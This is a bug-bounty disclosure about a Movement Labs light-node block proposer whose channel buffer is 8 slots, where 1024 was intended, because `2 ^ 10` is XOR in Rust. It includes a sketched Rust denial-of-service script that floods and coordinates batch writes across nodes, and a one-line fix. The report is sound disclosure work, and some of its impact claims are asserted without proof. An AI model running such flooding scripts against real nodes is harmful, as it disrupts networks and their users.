# #41337 \[BC-Insight] Channel buffer size in block proposer is too low leading to network delays and resource exhaustion

**Submitted on Mar 13th 2025 at 23:26:23 UTC by @Rhaydden for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #41337
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/light-node>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

The block proposer's channel buffer size implementation uses the XOR operator (`^`) instead of bit shifting (`<<`), resulting in a buffer of `8` slots instead of the intended `1024`. This significantly smaller buffer creates a bottleneck in block processing, potentially freeze network transactions by exploiting the backpressure mechanism. This would cause temporary transaction freezing during production.

## Vulnerability Details

Take a look at the `run_block_proposer` function where the channel buffer size is incorrectly specified:

```rust
let (sender, mut receiver) = tokio::sync::mpsc::channel(2 ^ 10); 
```

`^` operator in rust peerforms bitwise XOR, not exponentiation. This results in:

* 2 (binary: 0010) XOR 10 (binary: 1010) = 8 (binary: 1000)
* Actual buffer size: 8 slots
* The actual buffer size intended: 1024 slots (2¹⁰)

The small buffer creates a critical bottleneck between the block builder and publisher components:

1. Block Builder (`tick_build_blocks`):

```rust
sender.send(block).await?;
```

2. Block Publisher (`read_blocks`):

```rust
	match timeout(Duration::from_millis(remaining), receiver.recv()).await {
				Ok(Some(block)) => {
					// Process the block
					blocks.push(block);
				}
```

The timing mechanism in `read_blocks` becomes unreliable with the small buffer as it frequently hits timeouts during normal operation.

## Impact Details

this falls under:\
"Temporary freezing of network transactions by delaying one block by 500% or more of the average block time"

because the 8-slot buffer creates severe backpressure during normal operation. Block delays occur when the buffer fills, forcing the block builder to wait. Txns processing can effectively freeze as a result.

## References

<https://github.com/immunefi-team/attackathon-movement//blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/da/movement/protocol/light-node/src/sequencer.rs#L265>

## Proof of Concept

## Proof of Concept

This is a step by step run down of how this could be exploitted:

1. Environment Setup

```rust
# Build the light node
cargo build --release
```

2. Simple attack script setup

```rust
use tonic::Request;
use movement_protocol::grpc::{BatchWriteRequest, Blob};

struct DoSAttack {
    node_endpoints: Vec<String>,
    num_accounts: usize,
}

impl DoSAttack {
    fn new(endpoints: Vec<String>) -> Self {
        Self {
            node_endpoints: endpoints,
            num_accounts: 20,
        }
    }
}
```

3. Create attack txns:

```rust
fn create_attack_transaction() -> Blob {
    Blob {
        data: generate_valid_but_complex_transaction(),
        // Include valid signature and other required fields
    }
}

fn generate_attack_batch(size: usize) -> BatchWriteRequest {
    BatchWriteRequest {
        blobs: (0..size)
            .map(|_| create_attack_transaction())
            .collect(),
    }
}
```

4. Execute attack pattern

```rust
async fn execute_attack(&self, endpoint: String) {
    let client = connect_to_node(endpoint).await;
    
    // Phase 1: Fill the channel (8 slots)
    let batch1 = generate_attack_batch(8);
    client.batch_write(Request::new(batch1)).await?;
    
    // Phase 2: Create backpressure
    tokio::time::sleep(Duration::from_millis(100)).await;
    let batch2 = generate_attack_batch(16);
    client.batch_write(Request::new(batch2)).await?;
    
    // Phase 3: Amplify
    tokio::time::sleep(Duration::from_millis(100)).await;
    let batch3 = generate_attack_batch(32);
    client.batch_write(Request::new(batch3)).await?;
}
```

5. Coordinate multi-node attack

```rust
async fn launch_coordinated_attack(&self) {
    let attack_futures: Vec<_> = self.node_endpoints
        .iter()
        .map(|endpoint| {
            tokio::spawn(self.execute_attack(endpoint.clone()))
        })
        .collect();
    
    futures::future::join_all(attack_futures).await;
}
```

6. Monitor impact

```rust
async fn monitor_attack_impact(&self, endpoint: String) {
    loop {
        // Check node responsiveness
        let health = check_node_health(endpoint.clone()).await;
        
        // Monitor transaction latency
        let latency = measure_transaction_latency(endpoint.clone()).await;
        
        // Log results
        println!("Node health: {:?}, Latency: {}ms", health, latency);
        
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
}
```

#### Expected Results

1. After Phase 1 (0-1 seconds):

* Channel fills up (8 slots)
* Block builder starts experiencing delays

2. After Phase 2 (1-2 seconds):

* Block builder becomes blocked
* Memory pressure increases
* Transaction processing slows significantly

3. After Phase 3 (2+ seconds):

* Node becomes unresponsive
* Network synchronization issues appear
* Other nodes start experiencing cascading effects

## Fix

```diff
 	pub async fn run_block_proposer(&self) -> Result<(), anyhow::Error> {
-		let (sender, mut receiver) = tokio::sync::mpsc::channel(2 ^ 10);
+		let (sender, mut receiver) = tokio::sync::mpsc::channel(1 << 10);
 
 		loop {
 			match futures::try_join!(
```
